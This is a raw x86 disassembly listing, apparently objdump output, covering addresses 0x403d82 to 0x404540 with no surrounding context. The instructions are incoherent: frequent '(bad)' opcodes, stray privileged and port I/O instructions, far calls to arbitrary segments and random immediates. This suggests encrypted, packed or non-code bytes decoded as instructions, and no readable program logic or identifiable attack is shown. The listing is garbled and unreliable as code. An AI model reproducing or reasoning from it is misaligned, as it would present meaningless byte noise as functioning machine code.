  403d82:	cmc    
  403d83:	sbb    al,BYTE PTR [esi+0x4e]
  403d86:	scas   al,BYTE PTR es:[edi]
  403d87:	test   DWORD PTR [eax],0x219116a2
  403d8d:	push   edi
  403d8e:	add    al,0x6c
  403d90:	mov    eax,0x50cdbc9b
  403d95:	lock and BYTE PTR [eax],ch
  403d98:	dec    esi
  403d99:	test   BYTE PTR [ecx-0x750747ba],bl
  403d9f:	mov    ds:0x22337d11,eax
  403da4:	or     BYTE PTR [eax-0xc694013],al
  403daa:	push   esp
  403dab:	cdq    
  403dac:	xor    ecx,DWORD PTR [ecx-0x12a1cbb9]
  403db2:	(bad)  
  403db3:	aad    0x7e
  403db5:	sahf   
  403db6:	(bad)  
  403db7:	lock stos DWORD PTR es:[edi],eax
  403db9:	pusha  
  403dba:	fisttp DWORD PTR [esi-0xa]
  403dbd:	or     ecx,ecx
  403dbf:	imul   esp,ebx,0x67
  403dc2:	jno    0x403e01
  403dc4:	add    bl,dh
  403dc6:	(bad)  
  403dc7:	sub    DWORD PTR [eax+0xe],ebx
  403dca:	sub    edx,DWORD PTR [ecx-0x7c42644a]
  403dd0:	shl    DWORD PTR [esi],cl
  403dd2:	xor    DWORD PTR [ebx],edi
  403dd4:	add    BYTE PTR [eax+0x65a78fd5],bh
  403dda:	cli    
  403ddb:	xor    DWORD PTR [edi],ebx
  403ddd:	add    ebx,DWORD PTR [esi+0x428e0d87]
  403de3:	cmp    esi,DWORD PTR [ebp-0x42be8329]
  403de9:	retf   0xfd63
  403dec:	add    eax,0x1749b45c
  403df1:	inc    ecx
  403df2:	sbb    esi,esp
  403df4:	scas   eax,DWORD PTR es:[edi]
  403df5:	test   al,0x13
  403df7:	and    esi,DWORD PTR [edx]
  403df9:	xor    eax,0x938a9eec
  403dfe:	dec    ebx
  403dff:	sub    bl,BYTE PTR [eax+0x2096a39e]
  403e05:	nop
  403e06:	xchg   esp,eax
  403e07:	cmc    
  403e08:	js     0x403db7
  403e0a:	cmp    cl,BYTE PTR [ecx-0x40]
  403e0d:	or     ebx,ebp
  403e0f:	sti    
  403e10:	shl    BYTE PTR [esi],cl
  403e12:	add    eax,DWORD PTR [eax+0x6a]
  403e15:	mov    edi,0x62f7972a
  403e1a:	les    ebp,FWORD PTR [eax]
  403e1c:	dec    edi
  403e1d:	xor    al,0x73
  403e1f:	sahf   
  403e20:	pop    ebp
  403e21:	or     DWORD PTR [edx+eiz*1+0x69e376e5],ecx
  403e28:	dec    ebp
  403e29:	add    BYTE PTR [ebx-0x20a29f6],ch
  403e2f:	stos   DWORD PTR es:[edi],eax
  403e30:	arpl   di,sp
  403e32:	and    BYTE PTR [ebx-0x21],dl
  403e35:	pop    edi
  403e36:	leave  
  403e37:	pop    edx
  403e38:	or     dl,al
  403e3a:	push   esp
  403e3b:	jae    0x403df1
  403e3d:	jp     0x403eb1
  403e3f:	and    eax,DWORD PTR [ecx]
  403e41:	push   0xd0babcbf
  403e46:	jno    0x403e14
  403e48:	fisttp WORD PTR [eax+0x306233cc]
  403e4e:	bound  esp,QWORD PTR [ecx-0x55]
  403e51:	(bad)  
  403e52:	cmp    BYTE PTR [esi+0x1cc86a90],0x6b
  403e59:	mov    ebp,0x1c1fa65
  403e5e:	aad    0x97
  403e60:	and    BYTE PTR [edi+edi*4+0x6f07fb72],dh
  403e67:	pop    esp
  403e68:	inc    eax
  403e69:	jb     0x403eca
  403e6b:	mov    bh,0xdb
  403e6d:	int    0xbf
  403e6f:	ror    BYTE PTR [eax-0x5dd24a85],1
  403e75:	(bad)  
  403e76:	push   ebp
  403e77:	(bad)  
  403e78:	retf   
  403e79:	adc    al,dh
  403e7b:	imul   esi,DWORD PTR [eax-0x54],0x19120888
  403e82:	mov    ah,bl
  403e84:	cmp    ah,BYTE PTR [ebp-0x39d50b1e]
  403e8a:	call   0x7042:0x7a03d1
  403e91:	pusha  
  403e92:	iret   
  403e93:	xor    BYTE PTR [ebx-0x45],cl
  403e96:	jae    0x403e30
  403e98:	mov    ds:0xff35a4b3,eax
  403e9d:	call   0x8fac:0xeb188518
  403ea4:	jne    0x403ef6
  403ea6:	adc    DWORD PTR [edi],ebx
  403ea8:	enter  0x4da0,0xf4
  403eac:	mov    ds:0x3ca4f17b,al
  403eb1:	call   0x4359ccf9
  403eb6:	clc    
  403eb7:	(bad)  
  403eb8:	jo     0x403ee5
  403eba:	das    
  403ebb:	pop    ebx
  403ebc:	int    0x10
  403ebe:	xchg   ebx,eax
  403ebf:	mov    ds:0xb12672ea,eax
  403ec4:	inc    edi
  403ec5:	fcomp  DWORD PTR [edx-0x36ef25c7]
  403ecb:	cmp    ecx,DWORD PTR [ebx-0x1d609d94]
  403ed1:	mov    DWORD PTR [ecx],eax
  403ed3:	xor    dh,cl
  403ed5:	out    0x1a,al
  403ed7:	xchg   esi,eax
  403ed8:	js     0x403f20
  403eda:	push   edx
  403edb:	stc    
  403edc:	adc    eax,0x5d3cf923
  403ee1:	mov    ebp,0x986ff08a
  403ee6:	mov    cl,0x34
  403ee8:	pop    es
  403ee9:	sub    DWORD PTR [ebp-0x6a],0xacedbff
  403ef0:	js     0x403eec
  403ef2:	xor    al,0x0
  403ef4:	(bad)  
  403ef5:	gs push edi
  403ef7:	push   ss
  403ef8:	add    ecx,DWORD PTR [esi]
  403efa:	mov    dh,0xde
  403efc:	xchg   edi,eax
  403efd:	adc    BYTE PTR [ebx+0x2ce8e83d],0xa6
  403f04:	(bad)  
  403f05:	fiadd  DWORD PTR [edi]
  403f07:	test   ecx,esp
  403f09:	xchg   edx,eax
  403f0a:	push   ds
  403f0b:	xchg   ebp,eax
  403f0c:	ret    0xfbba
  403f0f:	mov    ch,0x16
  403f11:	xor    dl,BYTE PTR [ebp+0x7020bb4d]
  403f17:	out    dx,al
  403f18:	push   cs
  403f19:	enter  0x5c9,0xe0
  403f1d:	inc    ebp
  403f1e:	and    al,0x25
  403f20:	push   esp
  403f21:	lods   eax,DWORD PTR ds:[esi]
  403f22:	inc    edx
  403f23:	mov    esi,0x5d9f9fd9
  403f28:	dec    ebp
  403f29:	push   edi
  403f2a:	and    BYTE PTR [ebp-0x3],al
  403f2d:	scas   al,BYTE PTR es:[edi]
  403f2e:	mov    ebp,0x9b47a0e5
  403f33:	jge    0x403f29
  403f35:	push   esp
  403f36:	ss sahf 
  403f38:	cwde   
  403f39:	popf   
  403f3a:	xlat   BYTE PTR ds:[ebx]
  403f3b:	aad    0x7f
  403f3d:	xor    dl,dh
  403f3f:	je     0x403f44
  403f41:	mov    eax,0xed5c4d01
  403f46:	icebp  
  403f47:	push   0x3e4a8177
  403f4c:	pop    edi
  403f4d:	mov    ds:0x4f345b12,al
  403f52:	stos   BYTE PTR es:[edi],al
  403f53:	mov    ch,0xc6
  403f55:	fwait
  403f56:	mov    eax,0x571f00d0
  403f5b:	add    BYTE PTR [ecx-0x34],ch
  403f5e:	jg     0x403efd
  403f60:	add    al,0xe7
  403f62:	jmp    0x403f88
  403f64:	loop   0x403f7d
  403f66:	jbe    0x403f9f
  403f68:	jg     0x403f18
  403f6a:	cmc    
  403f6b:	mov    cs,WORD PTR [esi-0x5478c0a9]
  403f71:	cs mov bl,0x3f
  403f74:	add    eax,0x202d461c
  403f79:	ja     0x403f25
  403f7b:	xchg   ebp,eax
  403f7c:	mov    ecx,0x5407dce6
  403f81:	call   DWORD PTR [eax-0x1b70cd50]
  403f87:	mov    eax,ds:0x1a88a7cf
  403f8c:	xor    esp,ecx
  403f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f8f:	inc    edx
  403f90:	int3   
  403f91:	es inc edi
  403f93:	cli    
  403f94:	stos   BYTE PTR es:[edi],al
  403f95:	div    DWORD PTR [ecx+0x3dce47e8]
  403f9b:	push   eax
  403f9c:	out    0x3e,al
  403f9e:	mov    ebp,ecx
  403fa0:	add    edx,esp
  403fa2:	in     al,0x74
  403fa4:	pop    ebp
  403fa5:	inc    esi
  403fa6:	nop
  403fa7:	addr16 js 0x404009
  403faa:	(bad)  
  403fac:	jmp    0xd6411912
  403fb1:	pop    esp
  403fb2:	or     DWORD PTR [edi+0x2d386f47],edx
  403fb8:	jo     0x404020
  403fba:	sub    BYTE PTR [ebx-0x5b40000],bh
  403fc0:	les    ebx,FWORD PTR [ecx]
  403fc2:	sbb    esi,ebx
  403fc4:	hlt    
  403fc5:	(bad)  
  403fc6:	mov    ds:0x9535a3f7,al
  403fcb:	cld    
  403fcc:	xchg   ebx,eax
  403fcd:	mov    ds:0x3289a035,eax
  403fd2:	add    ah,BYTE PTR [ebp-0x4ea45b47]
  403fd8:	call   0xd8eaebfb
  403fdd:	mov    BYTE PTR [edx],dl
  403fdf:	dec    edi
  403fe0:	dec    ebp
  403fe1:	sub    edx,DWORD PTR [ebp+0x5cbd7d4d]
  403fe7:	inc    eax
  403fe8:	sub    al,0x7
  403fea:	stos   DWORD PTR es:[edi],eax
  403feb:	inc    ebx
  403fec:	sbb    al,0x91
  403fee:	dec    si
  403ff0:	adc    DWORD PTR [ecx+edx*4+0x4d],esp
  403ff4:	and    edx,esi
  403ff6:	or     BYTE PTR [ecx+0x70],al
  403ff9:	dec    eax
  403ffa:	jg     0x40403f
  403ffc:	inc    eax
  403ffd:	faddp  st(1),st
  403fff:	mov    ds:0xa4267dd5,al
  404004:	in     eax,0xeb
  404006:	lss    esi,FWORD PTR [ecx+edx*2-0x387b55c8]
  40400e:	mov    eax,0x5f5698f4
  404013:	repnz test al,0xc0
  404016:	(bad)  
  404017:	div    edi
  404019:	jp     0x40405c
  40401b:	cld    
  40401c:	(bad)  
  40401d:	in     al,dx
  40401e:	mov    edi,0x4f5cd7
  404023:	push   0x11d96cdb
  404028:	(bad)  
  404029:	cmp    eax,0xdd52663
  40402e:	cmc    
  40402f:	inc    eax
  404030:	repz and al,cl
  404033:	(bad)  
  404034:	out    dx,eax
  404035:	adc    BYTE PTR [esi+0x62],bl
  404038:	adc    eax,0x607e4125
  40403d:	and    al,0x71
  40403f:	rcr    dh,1
  404041:	jmp    ebx
  404043:	xor    eax,DWORD PTR [edi-0xf5a2bfa]
  404049:	std    
  40404a:	test   BYTE PTR [edi+0x5d],al
  40404d:	sti    
  40404e:	mov    ah,0xc9
  404050:	mov    ch,0x77
  404052:	test   al,0x38
  404054:	xor    BYTE PTR [eax-0x68],0xbe
  404058:	pop    es
  404059:	push   0x71160cc9
  40405e:	stc    
  40405f:	mov    ds:0x16cca90,al
  404064:	jge    0x404033
  404066:	pop    esp
  404067:	xchg   edi,eax
  404068:	out    dx,al
  404069:	(bad)  
  40406a:	or     eax,0x3dd21715
  40406f:	fwait
  404070:	in     al,0xc9
  404072:	xor    dh,al
  404074:	adc    bh,cl
  404076:	add    BYTE PTR [eax],ch
  404078:	jp     0x40404f
  40407a:	push   ecx
  40407b:	loop   0x4040df
  40407d:	shl    BYTE PTR [ecx+0x74],cl
  404080:	loope  0x4040fa
  404082:	hlt    
  404083:	paddsb mm5,QWORD PTR [edi-0x3c]
  404087:	add    BYTE PTR [ecx-0x146a9785],al
  40408d:	dec    ecx
  40408e:	outs   dx,DWORD PTR ds:[esi]
  40408f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404090:	ins    DWORD PTR es:[edi],dx
  404091:	stos   BYTE PTR es:[edi],al
  404092:	add    BYTE PTR [eax-0x77f9ed2c],bh
  404098:	pop    edx
  404099:	test   dh,bh
  40409b:	fdiv   st,st(0)
  40409d:	xor    cl,bh
  40409f:	call   0x7c5debea
  4040a4:	(bad)  
  4040a6:	sbb    al,0x4c
  4040a8:	jae    0x40402b
  4040aa:	and    ebx,DWORD PTR ds:0x2d240bb9
  4040b0:	aas    
  4040b1:	(bad)  
  4040b3:	iret   
  4040b4:	and    ebp,DWORD PTR [ecx-0x17]
  4040b7:	enter  0xdaf3,0x6f
  4040bb:	rol    DWORD PTR [edx-0x6b],1
  4040be:	aas    
  4040bf:	(bad)  
  4040c0:	jb     0x4040c1
  4040c2:	mov    eax,0xe660df72
  4040c7:	jne    0x4040e0
  4040c9:	repz push esi
  4040cb:	ins    BYTE PTR es:[edi],dx
  4040cc:	ds jge 0x40410f
  4040cf:	imul   edx,DWORD PTR [esi],0x7
  4040d2:	mov    al,ds:0xef782b04
  4040d7:	add    ebp,DWORD PTR [ebx]
  4040d9:	push   cs
  4040da:	jle    0x4040d6
  4040dc:	std    
  4040dd:	arpl   WORD PTR [ecx],cx
  4040df:	std    
  4040e0:	cmc    
  4040e1:	icebp  
  4040e2:	xchg   BYTE PTR [ecx],bl
  4040e4:	addr16 mov ?,eax
  4040e7:	push   ds
  4040e8:	dec    edi
  4040e9:	add    al,0x59
  4040eb:	daa    
  4040ec:	add    BYTE PTR [esi+0x6a],dh
  4040ef:	push   es
  4040f0:	and    BYTE PTR [esi-0x6ce0ad28],bl
  4040f6:	int    0xfc
  4040f8:	pop    ss
  4040f9:	xor    DWORD PTR [edi],0x6d
  4040fc:	and    DWORD PTR [edx],esi
  4040fe:	mov    cl,0xda
  404100:	bound  esp,QWORD PTR es:[ebx]
  404103:	push   esp
  404104:	add    ch,bh
  404106:	(bad)
  40410a:	dec    edi
  40410b:	push   0xfffffffc
  40410d:	rcr    DWORD PTR [eax+0x2aa1fbb5],1
  404113:	or     eax,0xfa9b9b74
  404118:	jb     0x4040d5
  40411a:	sub    DWORD PTR [ebx+0x6a],esp
  40411d:	jmp    0xa55:0xea6d8cbf
  404124:	leave  
  404125:	ja     0x4040d9
  404127:	aad    0xcd
  404129:	aas    
  40412a:	and    BYTE PTR [ecx],al
  40412c:	lods   eax,DWORD PTR gs:[esi]
  40412e:	push   ebp
  40412f:	bnd jb 0x4040c4
  404132:	and    eax,0x37efb464
  404137:	pop    ecx
  404138:	and    esi,ebx
  40413a:	daa    
  40413b:	iret   
  40413c:	mov    bh,dl
  40413e:	fdiv   DWORD PTR [ebp+esi*1-0x33]
  404142:	or     ebx,esp
  404144:	mov    bl,0x28
  404146:	jl     0x404188
  404148:	cld    
  404149:	sbb    DWORD PTR [esi+edx*8-0x73],ebp
  40414d:	das    
  40414e:	popf   
  40414f:	ins    BYTE PTR es:[edi],dx
  404150:	sbb    al,BYTE PTR [eax]
  404152:	adc    ch,cl
  404154:	cli    
  404155:	stos   BYTE PTR es:[edi],al
  404156:	push   esi
  404157:	shr    BYTE PTR [ebx-0x2b],0x4b
  40415b:	mov    al,0xfd
  40415d:	inc    esp
  40415e:	and    DWORD PTR [ecx+0x47],0xd1914633
  404165:	lods   eax,DWORD PTR ds:[esi]
  404166:	adc    eax,0x64ba7205
  40416b:	hlt    
  40416c:	jecxz  0x4041b1
  40416e:	add    al,0x1e
  404170:	pop    esi
  404171:	or     al,0xfb
  404173:	dec    ebp
  404174:	enter  0x6339,0x48
  404178:	cmp    eax,0xab186406
  40417d:	xchg   edi,eax
  40417e:	in     al,0xe1
  404180:	adc    BYTE PTR [eax+0x1e86f1d5],ah
  404186:	jbe    0x404114
  404188:	and    al,0x9
  40418a:	imul   ebx,DWORD PTR [edx+esi*4+0x70],0x9f08ad83
  404192:	xchg   BYTE PTR [ebp-0x3057b862],bh
  404198:	(bad)  
  40419a:	sahf   
  40419b:	lahf   
  40419c:	cdq    
  40419d:	pop    ecx
  40419e:	xchg   ecx,eax
  40419f:	jo     0x4041c4
  4041a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041a2:	mov    al,0x80
  4041a4:	mov    ch,0x0
  4041a6:	inc    edx
  4041a7:	dec    edx
  4041a8:	cmp    al,0x17
  4041aa:	popf   
  4041ab:	inc    ecx
  4041ac:	or     al,0x81
  4041ae:	inc    esp
  4041af:	inc    ecx
  4041b0:	pop    ebp
  4041b1:	cmp    ecx,ebx
  4041b3:	inc    ebx
  4041b4:	ins    DWORD PTR es:[edi],dx
  4041b5:	lods   eax,DWORD PTR ds:[esi]
  4041b6:	add    BYTE PTR [esi],cl
  4041b8:	and    BYTE PTR ds:[eax],0xe1
  4041bc:	ds mov dl,0xb6
  4041bf:	js     0x404208
  4041c1:	jecxz  0x4041cf
  4041c3:	aaa    
  4041c4:	inc    esi
  4041c5:	rcr    DWORD PTR [edx+0x3946a9b1],cl
  4041cb:	scas   al,BYTE PTR es:[edi]
  4041cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041cd:	jbe    0x40417e
  4041cf:	aaa    
  4041d0:	mov    al,ds:0x98f81527
  4041d5:	pop    ss
  4041d6:	sub    DWORD PTR [eax-0x9],0x9
  4041da:	adc    dh,BYTE PTR [edi+0x3e8439f0]
  4041e0:	repnz push 0x3e
  4041e3:	icebp  
  4041e4:	out    dx,al
  4041e5:	pop    edx
  4041e6:	test   al,0x67
  4041e8:	ror    bh,cl
  4041ea:	or     ebp,DWORD PTR [eax+0x19dffcd]
  4041f0:	(bad)  [esi-0x612471d9]
  4041f6:	mov    cl,0x1b
  4041f8:	rcl    DWORD PTR [ebx-0x5c327bbc],cl
  4041fe:	shr    ch,cl
  404200:	fcomi  st,st(2)
  404202:	push   0xfec2db22
  404207:	adc    al,0xf8
  404209:	push   ebp
  40420a:	pop    ebp
  40420b:	cmp    esi,eax
  40420d:	gs retf 
  40420f:	mov    dl,0xe8
  404211:	ss jno 0x404291
  404214:	out    dx,al
  404215:	push   es
  404216:	out    0xfd,eax
  404218:	test   eax,0x3200761a
  40421d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40421e:	sub    ah,al
  404220:	(bad)
  404225:	xlat   BYTE PTR ds:[ebx]
  404226:	lds    ecx,FWORD PTR [edx-0x5a]
  404229:	pop    ecx
  40422a:	push   0xffffffdf
  40422c:	std    
  40422d:	aas    
  40422e:	imul   ebp,edi,0xffffff8b
  404231:	scas   eax,DWORD PTR es:[edi]
  404232:	jno    0x4041f2
  404234:	and    edx,esp
  404236:	je     0x4041c6
  404238:	(bad)  
  404239:	adc    bl,dl
  40423b:	mov    ds:0x93d2617a,eax
  404240:	in     al,0xe9
  404242:	int3   
  404243:	ret    0x6f26
  404246:	leave  
  404247:	repnz mov al,0xf1
  40424a:	imul   esp,DWORD PTR [edi+0x53],0x58
  40424e:	imul   edx,DWORD PTR [edi-0x43],0x1f066fc7
  404255:	jp     0x4042cb
  404257:	ss test eax,0x82af61a
  40425d:	pop    ds
  40425e:	call   FWORD PTR [edx]
  404260:	xchg   esi,eax
  404261:	mov    al,0x5
  404263:	dec    edx
  404264:	adc    al,0x81
  404266:	(bad)  
  404267:	jns    0x4041eb
  404269:	mul    DWORD PTR [edi+ebp*8]
  40426c:	and    DWORD PTR [edx],ebp
  40426e:	and    bh,bl
  404270:	scas   eax,DWORD PTR es:[edi]
  404271:	xchg   ecx,eax
  404272:	sbb    BYTE PTR [esi-0x41e487f3],cl
  404278:	jnp    0x404205
  40427a:	and    esi,DWORD PTR [ebx-0x7cdf9222]
  404280:	add    BYTE PTR [eax-0x23],cl
  404283:	pop    ss
  404284:	rol    BYTE PTR [edx],cl
  404286:	adc    al,0x1d
  404288:	loop   0x404216
  40428a:	xchg   dh,dh
  40428c:	jbe    0x404285
  40428e:	pop    edx
  40428f:	std    
  404290:	inc    esi
  404291:	popa   
  404292:	in     al,0x6
  404294:	push   ss
  404295:	sti    
  404296:	in     al,0xfd
  404298:	and    eax,0x6dacd985
  40429d:	imul   ecx,DWORD PTR [edi+0x159665a],0x6b386fc3
  4042a7:	sub    al,0x75
  4042a9:	or     ch,dl
  4042ab:	test   eax,0x35778dd0
  4042b0:	rcl    DWORD PTR [ebp-0x23353bf7],cl
  4042b6:	arpl   WORD PTR [ebx],dx
  4042b8:	retf   0xedc4
  4042bb:	sbb    BYTE PTR [edi],0xa0
  4042be:	mov    BYTE PTR [esp+0x70],cl
  4042c2:	neg    ah
  4042c4:	sbb    eax,0x16ea6e01
  4042c9:	icebp  
  4042ca:	jecxz  0x40432f
  4042cc:	cli    
  4042cd:	adc    BYTE PTR [bp+di-0x7],0x8f
  4042d2:	push   cs
  4042d3:	mov    edx,0xe554c500
  4042d8:	add    ecx,DWORD PTR [ebp-0x67978316]
  4042de:	pop    ebx
  4042df:	or     ch,BYTE PTR [ebx-0x58]
  4042e2:	in     eax,0x92
  4042e4:	jb     0x4042e6
  4042e6:	dec    ecx
  4042e7:	jg     0x4042c5
  4042e9:	jno    0x404364
  4042eb:	adc    DWORD PTR [edx-0x2b],ebx
  4042ee:	fdiv   QWORD PTR [edx+0x5]
  4042f1:	into   
  4042f2:	(bad)  
  4042f3:	fdiv   QWORD PTR [ebx-0x39]
  4042f6:	or     eax,0x15cce387
  4042fb:	stc    
  4042fc:	ins    DWORD PTR es:[edi],dx
  4042fd:	rcl    DWORD PTR [eax],cl
  4042ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404300:	fnop   
  404302:	add    BYTE PTR [eax+eax*2],bl
  404305:	leave  
  404306:	adc    edx,edx
  404308:	out    dx,eax
  404309:	leave  
  40430a:	loope  0x40434b
  40430c:	imul   esp,DWORD PTR [esi+0x74],0x7c6db69c
  404313:	xor    al,BYTE PTR [ecx]
  404315:	inc    esi
  404316:	ss inc esi
  404318:	loopne 0x4042eb
  40431a:	inc    esp
  40431b:	push   ss
  40431c:	jbe    0x40438f
  40431e:	scas   al,BYTE PTR es:[edi]
  40431f:	xor    bh,ah
  404321:	sahf   
  404322:	lods   eax,DWORD PTR ds:[esi]
  404323:	inc    eax
  404324:	jno    0x404335
  404326:	pushf  
  404327:	adc    ecx,ebx
  404329:	clc    
  40432a:	pop    esi
  40432b:	loop   0x404389
  40432d:	jbe    0x404372
  40432f:	outs   dx,DWORD PTR ds:[esi]
  404330:	inc    BYTE PTR [ecx+0x8687f40]
  404336:	pop    ecx
  404337:	into   
  404338:	rcl    bh,cl
  40433a:	dec    ebp
  40433b:	sahf   
  40433c:	inc    esp
  40433d:	mov    DWORD PTR [eax-0x48],ebp
  404340:	jns    0x404378
  404342:	imul   ebp,DWORD PTR [eax+0x5b5da7ef],0x55
  404349:	adc    BYTE PTR [eax],al
  40434b:	popa   
  40434c:	mov    al,bl
  40434e:	mov    gs,WORD PTR [ebp-0x9]
  404351:	pop    edi
  404352:	sbb    DWORD PTR [esi-0x19],edi
  404355:	cmc    
  404356:	mov    al,ds:0xef4c165e
  40435b:	dec    edi
  40435c:	inc    esi
  40435d:	ficom  DWORD PTR [edi+0x17]
  404360:	inc    ebx
  404361:	dec    ebx
  404362:	inc    eax
  404363:	adc    al,0x33
  404365:	(bad)  [ecx-0x29991ddc]
  40436b:	sub    DWORD PTR [edx],edx
  40436d:	icebp  
  40436e:	push   eax
  40436f:	jp     0x4043f0
  404371:	push   edx
  404372:	pop    ds
  404373:	jns    0x4043e4
  404375:	les    ebp,FWORD PTR [esi-0x4681618d]
  40437b:	jb     0x40434b
  40437d:	call   0x1e0bbe26
  404382:	mov    bl,0x7b
  404384:	fwait
  404385:	mov    edi,DWORD PTR [edx]
  404387:	push   ecx
  404388:	push   0x31
  40438a:	add    eax,0xa77a52
  40438f:	loope  0x40433a
  404391:	aaa    
  404392:	add    eax,0x93079ef6
  404397:	pop    edi
  404398:	xchg   edi,eax
  404399:	push   esi
  40439a:	sub    DWORD PTR [eax-0x64],ebp
  40439d:	mov    di,0xec08
  4043a1:	jp     0x4043d1
  4043a3:	push   esp
  4043a5:	dec    edx
  4043a6:	mov    eax,0x219ed56
  4043ab:	mov    eax,ds:0x9429e6
  4043b0:	dec    edi
  4043b1:	sar    DWORD PTR [edi+esi*1-0x5e733a48],cl
  4043b8:	push   ecx
  4043b9:	fcomp  st(5)
  4043bb:	sbb    esi,DWORD PTR [esi+0x7b8dedd7]
  4043c1:	fld    DWORD PTR [eax]
  4043c3:	add    BYTE PTR [edx-0x1e],ah
  4043c6:	das    
  4043c7:	inc    ecx
  4043c8:	jns    0x404385
  4043ca:	pusha  
  4043cb:	and    BYTE PTR [eax-0x4e],0x53
  4043cf:	ret    
  4043d0:	pop    ds
  4043d1:	in     eax,0xc3
  4043d3:	add    al,0x6
  4043d5:	cld    
  4043d6:	hlt    
  4043d7:	inc    ebp
  4043d8:	frstor [edx]
  4043da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043db:	xchg   ah,dl
  4043dd:	adc    eax,0x9d73c797
  4043e2:	mov    ecx,DWORD PTR [eax]
  4043e4:	push   0xffffff9a
  4043e6:	mov    edx,0xe9637149
  4043eb:	mov    ch,BYTE PTR [eax+0x7c]
  4043ee:	fmul   st,st(3)
  4043f0:	mov    bh,0x49
  4043f2:	dec    esi
  4043f3:	or     al,0x4e
  4043f5:	es jg  0x404445
  4043f8:	xchg   ebp,eax
  4043f9:	push   edi
  4043fa:	sub    al,0x8e
  4043fc:	jl     0x40445e
  4043fe:	sbb    eax,0x139731cf
  404403:	push   ecx
  404404:	sub    BYTE PTR [eax+0x2a621022],ah
  40440a:	mov    cl,0x70
  40440c:	mov    cl,0x21
  40440e:	xchg   esp,eax
  40440f:	inc    ecx
  404410:	lock in al,0x56
  404413:	xlat   BYTE PTR ds:[ebx]
  404414:	add    BYTE PTR [edi],ch
  404416:	ret    
  404417:	outs   dx,DWORD PTR ds:[esi]
  404418:	out    0x56,al
  40441a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40441b:	mov    dh,BYTE PTR [ebp-0x7b7e4a73]
  404421:	aam    0x40
  404423:	or     BYTE PTR [eax-0x56faa8f5],bl
  404429:	jp     0x40445d
  40442b:	(bad)  
  40442c:	stc    
  40442d:	mov    ecx,0xe8caef19
  404432:	pop    esp
  404433:	sub    al,0x5d
  404435:	daa    
  404436:	dec    ebx
  404437:	sbb    DWORD PTR [esi+ebx*2+0x6e],ebp
  40443b:	inc    edx
  40443c:	aas    
  40443d:	xchg   ebp,eax
  40443e:	ins    DWORD PTR es:[edi],dx
  40443f:	dec    ebx
  404440:	push   cs
  404441:	int3   
  404442:	dec    ebp
  404443:	and    DWORD PTR [eax+eax*8],0x4115843e
  40444a:	pop    ebx
  40444b:	jae    0x404493
  40444d:	sbb    BYTE PTR [edx+ebx*2+0x77],0xc3
  404452:	adc    DWORD PTR [ebp-0x4fd6031f],ebx
  404458:	rol    BYTE PTR [ebp-0x1],1
  40445b:	mov    BYTE PTR [ebx-0x4d421782],0xc7
  404462:	xchg   ebp,eax
  404463:	inc    edi
  404464:	scas   al,BYTE PTR es:[edi]
  404465:	clc    
  404466:	jne    0x4044a4
  404468:	lahf   
  404469:	or     DWORD PTR [ebx+0x19],edx
  40446c:	int3   
  40446d:	dec    edx
  40446e:	fs xor bh,ch
  404471:	jnp    0x40440c
  404473:	repz push 0xffffffb4
  404476:	mov    eax,ds:0xd0059d8
  40447b:	mov    bh,0xfd
  40447d:	or     BYTE PTR [esi-0x50],al
  404480:	push   es
  404481:	cmp    BYTE PTR [edi-0x27],bh
  404484:	(bad)  
  404485:	cmp    eax,0x46a6c82c
  40448a:	gs xchg ebp,eax
  40448d:	xor    ebp,DWORD PTR [esi]
  40448f:	dec    edx
  404490:	aam    0x18
  404492:	inc    edi
  404493:	or     DWORD PTR [ebx-0x753c2f27],eax
  404499:	repnz mov ds:0xd3076182,eax
  40449f:	inc    ebp
  4044a0:	pop    eax
  4044a1:	cld    
  4044a2:	int    0x4
  4044a4:	inc    DWORD PTR [esi+eiz*8-0x10801131]
  4044ab:	mov    cs,ebp
  4044ad:	pop    edx
  4044ae:	mov    ah,0x51
  4044b0:	int3   
  4044b1:	jno    0x404530
  4044b3:	adc    bl,bh
  4044b5:	mov    al,0xb
  4044b7:	int3   
  4044b8:	adc    bl,BYTE PTR [edx+ebp*1+0x59bf298b]
  4044bf:	dec    esi
  4044c0:	adc    dh,al
  4044c2:	cmp    BYTE PTR ds:0xd6152a58,cl
  4044c8:	push   eax
  4044c9:	and    esp,ebx
  4044cb:	adc    eax,0x5287342a
  4044d0:	xor    ecx,DWORD PTR [edi+0x6e]
  4044d3:	xchg   ebx,eax
  4044d4:	pop    esp
  4044d5:	push   cs
  4044d6:	fcomp  st(0)
  4044d8:	ins    BYTE PTR es:[edi],dx
  4044d9:	cmc    
  4044da:	clc    
  4044db:	sbb    DWORD PTR [esi+0x573d00e0],ecx
  4044e1:	outs   dx,DWORD PTR ds:[esi]
  4044e2:	jmp    0x4044ee
  4044e4:	cwde   
  4044e5:	loopne 0x40454a
  4044e7:	pop    ds
  4044e8:	(bad)  
  4044ea:	push   0x8de21e16
  4044ef:	mov    ebp,0xf476fb5a
  4044f4:	fwait
  4044f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044f6:	mov    bh,0x62
  4044f8:	loopne 0x40449e
  4044fa:	int3   
  4044fb:	xor    esp,DWORD PTR [ecx]
  4044fd:	add    DWORD PTR [edi+0x768a37cb],eax
  404503:	shl    BYTE PTR [esi],0xcb
  404506:	mov    ds:0x8a552c85,eax
  40450b:	inc    esi
  40450c:	cmp    eax,0xaf36114
  404511:	xlat   BYTE PTR ds:[ebx]
  404512:	js     0x40455c
  404514:	fist   DWORD PTR [ebp+0x517209a7]
  40451a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40451b:	xchg   edx,eax
  40451c:	adc    BYTE PTR [eax],0xc5
  40451f:	dec    edi
  404521:	shl    DWORD PTR [esp+ecx*8+0x7c1b929e],cl
  404528:	mov    ds:0xb37f125d,al
  40452d:	sbb    al,0x29
  40452f:	pop    edx
  404530:	test   bh,bl
  404532:	xor    BYTE PTR [ecx],dh
  404534:	push   ebp
  404535:	sahf   
  404536:	fbstp  TBYTE PTR [ebx-0x19]
  404539:	pop    eax
  40453a:	out    dx,al
  40453b:	jp     0x404534
  40453d:	pop    ss
  40453e:	int    0x99
  404540:	cmp    bl,bl
